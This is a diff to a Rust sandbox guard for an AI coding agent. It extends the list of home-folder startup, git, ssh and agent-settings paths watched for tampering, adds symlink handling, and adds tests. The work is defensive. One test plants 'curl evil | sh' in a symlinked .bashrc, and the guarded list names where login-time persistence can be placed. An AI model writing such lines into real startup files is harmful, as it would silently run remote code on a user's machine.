@@ -17,17 +17,43 @@ pub const GUARDED: &[&str] =
 /// Paths under the home folder (relative to it) that run code outside the sandbox at the next login or
 /// give a way in later. They are watched only where the sandbox lets a command write the home folder,
 /// which is what starting in `~` (or in a parent of it) does.
+///
+/// The agent settings of the home folder are listed by their settings files and folders, not whole: the
+/// folders around them hold sessions and caches that change while any command runs.
 pub const HOME_GUARDED: &[&str] = &[
     ".bashrc",
     ".bash_profile",
+    // bash reads this one when there is no `.bash_profile`
+    ".bash_login",
+    ".bash_logout",
     ".profile",
     ".zshrc",
     ".zshenv",
     ".zprofile",
-    ".ssh",
+    ".zlogin",
+    ".zlogout",
+    ".xprofile",
+    ".xinitrc",
+    ".xsession",
+    ".config/fish/config.fish",
+    ".config/fish/conf.d",
+    ".config/environment.d",
     ".config/autostart",
     ".config/systemd/user",
+    // aliases and `core.*` settings of git run programs
+    ".gitconfig",
+    ".config/git/config",
+    ".ssh",
     ".local/bin",
+    ".nexo/config.toml",
+    ".nexo/prompt.md",
+    ".nexo/commands",
+    ".nexo/agents",
+    ".config/nexo",
+    ".claude/settings.json",
+    ".claude/commands",
+    ".claude/agents",
+    ".codex/config.toml",
 ];
 
 /// Start of the line that goes into the tool result (the agent turns it into a warning for the person).
@@ -44,6 +70,9 @@ enum Sig {
     File(u64, Option<SystemTime>),
     /// A directory; the mtime only when it was too big to list.
     Dir(Option<SystemTime>),
+    /// A symlink: where it points, and what is there (None when it points at nothing). A dotfile manager
+    /// makes `~/.bashrc` one, and an edit through it leaves the link itself as it was.
+    Link(PathBuf, Option<Box<Sig>>),
 }
 
 /// What the guarded paths looked like at one moment.
@@ -62,6 +91,12 @@ fn sig(meta: &std::fs::Metadata, listed: bool) -> Sig {
     }
 }
 
+/// A symlink at `p`: its target and what the target looks like now (`listed` as in `sig`).
+fn link_sig(p: &Path, listed: bool) -> Sig {
+    let to = std::fs::read_link(p).unwrap_or_default();
+    Sig::Link(to, std::fs::metadata(p).ok().map(|m| Box::new(sig(&m, listed))))
+}
+
 /// Walks `dir` (already known to be a directory) at most `MAX_DEPTH` levels and `MAX_ENTRIES` entries.
 /// Returns false when it stopped for size.
 fn walk(dir: &Path, depth: usize, count: &mut usize, out: &mut BTreeMap<PathBuf, Sig>) -> bool {
@@ -73,6 +108,11 @@ fn walk(dir: &Path, depth: usize, count: &mut usize, out: &mut BTreeMap<PathBuf,
         }
         let p = e.path();
         let Ok(m) = std::fs::symlink_metadata(&p) else { continue };
+        if m.file_type().is_symlink() {
+            // not followed into: what it points at is looked at as one entry, so a loop cannot trap the walk
+            out.insert(p.clone(), link_sig(&p, false));
+            continue;
+        }
         out.insert(p.clone(), sig(&m, true));
         if m.is_dir() && depth < MAX_DEPTH && !walk(&p, depth + 1, count, out) {
             return false;
@@ -134,16 +174,29 @@ pub fn before(s: &SandboxSettings, cwd: &Path) -> Option<Snapshot> {
 fn take(cwd: &Path, roots: &[PathBuf], home: Option<&Path>) -> Snapshot {
     let mut snap = Snapshot::default();
     for t in targets(cwd, roots, home) {
-        if let Ok(m) = std::fs::symlink_metadata(&t) {
-            if m.is_dir() {
-                let (mut n, mut sub) = (0, BTreeMap::new());
-                let whole = walk(&t, 1, &mut n, &mut sub);
-                if whole {
-                    snap.seen.extend(sub);
+        if let Ok(own) = std::fs::symlink_metadata(&t) {
+            let link = own.file_type().is_symlink();
+            // a guarded path that is a symlink is read through: the edit lands in what it points at
+            match if link { std::fs::metadata(&t) } else { Ok(own) } {
+                Ok(m) if m.is_dir() => {
+                    let (mut n, mut sub) = (0, BTreeMap::new());
+                    let whole = walk(&t, 1, &mut n, &mut sub);
+                    if whole {
+                        snap.seen.extend(sub);
+                    }
+                    let s = sig(&m, whole);
+                    let s =
+                        if link { Sig::Link(std::fs::read_link(&t).unwrap_or_default(), Some(Box::new(s))) } else { s };
+                    snap.seen.insert(t.clone(), s);
                 }
-                snap.seen.insert(t.clone(), sig(&m, whole));
-            } else {
-                snap.seen.insert(t.clone(), sig(&m, true));
+                Ok(m) => {
+                    let s = if link { link_sig(&t, true) } else { sig(&m, true) };
+                    snap.seen.insert(t.clone(), s);
+                }
+                // a link that points at nothing is still a link that can be retargeted
+                Err(_) => {
+                    snap.seen.insert(t.clone(), link_sig(&t, true));
+                }
             }
         }
         snap.top.push(t);
@@ -326,6 +379,84 @@ mod tests {
         let b = take(&proj, &roots, Some(&home));
         fs::write(home.join(".bashrc"), "x").unwrap();
         assert!(after_in(b, &ws(), &proj, Some(&home)).is_none());
+    }
+
+    /// A home folder with a project inside, and the roots that let a command write all of it.
+    fn home_and_project(d: &Path) -> (PathBuf, PathBuf, Vec<PathBuf>) {
+        let home = d.join("home");
+        let proj = home.join("proj");
+        fs::create_dir_all(&proj).unwrap();
+        let roots = vec![home.canonicalize().unwrap()];
+        (home, proj, roots)
+    }
+
+    fn home_diff(home: &Path, proj: &Path, roots: &[PathBuf], act: impl FnOnce()) -> Option<String> {
+        let b = take(proj, roots, Some(home));
+        act();
+        after_in(b, &ws(), proj, Some(home))
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn an_edit_made_through_a_symlinked_dotfile_is_named() {
+        let d = tempfile::tempdir().unwrap();
+        let (home, proj, roots) = home_and_project(d.path());
+        fs::create_dir_all(home.join("dotfiles")).unwrap();
+        fs::write(home.join("dotfiles/bashrc"), "a").unwrap();
+        std::os::unix::fs::symlink(home.join("dotfiles/bashrc"), home.join(".bashrc")).unwrap();
+        let n = home_diff(&home, &proj, &roots, || fs::write(home.join(".bashrc"), "curl evil | sh").unwrap()).unwrap();
+        assert!(n.contains(".bashrc"), "{n}");
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn a_new_file_in_a_symlinked_directory_is_named_and_a_retargeted_link_too() {
+        let d = tempfile::tempdir().unwrap();
+        let (home, proj, roots) = home_and_project(d.path());
+        fs::create_dir_all(home.join("dotfiles/bin")).unwrap();
+        fs::create_dir_all(home.join(".local")).unwrap();
+        std::os::unix::fs::symlink(home.join("dotfiles/bin"), home.join(".local/bin")).unwrap();
+        let n = home_diff(&home, &proj, &roots, || fs::write(home.join(".local/bin/ls"), "x").unwrap()).unwrap();
+        assert!(n.contains(".local/bin/ls"), "{n}");
+        // a link to nothing, then pointed somewhere else
+        std::os::unix::fs::symlink(home.join("nowhere"), home.join(".zshrc")).unwrap();
+        let n = home_diff(&home, &proj, &roots, || {
+            fs::remove_file(home.join(".zshrc")).unwrap();
+            std::os::unix::fs::symlink(home.join("elsewhere"), home.join(".zshrc")).unwrap();
+        })
+        .unwrap();
+        assert!(n.contains(".zshrc"), "{n}");
+        // a link nobody touched says nothing
+        assert!(home_diff(&home, &proj, &roots, || ()).is_none());
+    }
+
+    #[test]
+    fn login_files_of_other_shells_and_git_are_named() {
+        let d = tempfile::tempdir().unwrap();
+        let (home, proj, roots) = home_and_project(d.path());
+        for f in [".bash_login", ".zlogin", ".xprofile", ".gitconfig"] {
+            let n = home_diff(&home, &proj, &roots, || fs::write(home.join(f), "x").unwrap()).unwrap();
+            assert!(n.contains(f), "{f}: {n}");
+        }
+        fs::create_dir_all(home.join(".config/environment.d")).unwrap();
+        let n = home_diff(&home, &proj, &roots, || fs::write(home.join(".config/environment.d/a.conf"), "x").unwrap())
+            .unwrap();
+        assert!(n.contains("environment.d/a.conf"), "{n}");
+    }
+
+    #[test]
+    fn agent_settings_of_the_home_are_named_from_a_project_but_its_sessions_are_not() {
+        let d = tempfile::tempdir().unwrap();
+        let (home, proj, roots) = home_and_project(d.path());
+        fs::create_dir_all(home.join(".nexo/sessions")).unwrap();
+        assert!(
+            home_diff(&home, &proj, &roots, || fs::write(home.join(".nexo/sessions/s.jsonl"), "x").unwrap()).is_none()
+        );
+        for f in [".nexo/config.toml", ".claude/settings.json"] {
+            fs::create_dir_all(home.join(f).parent().unwrap()).unwrap();
+            let n = home_diff(&home, &proj, &roots, || fs::write(home.join(f), "x").unwrap()).unwrap();
+            assert!(n.contains(f), "{f}: {n}");
+        }
     }
 
     #[test]
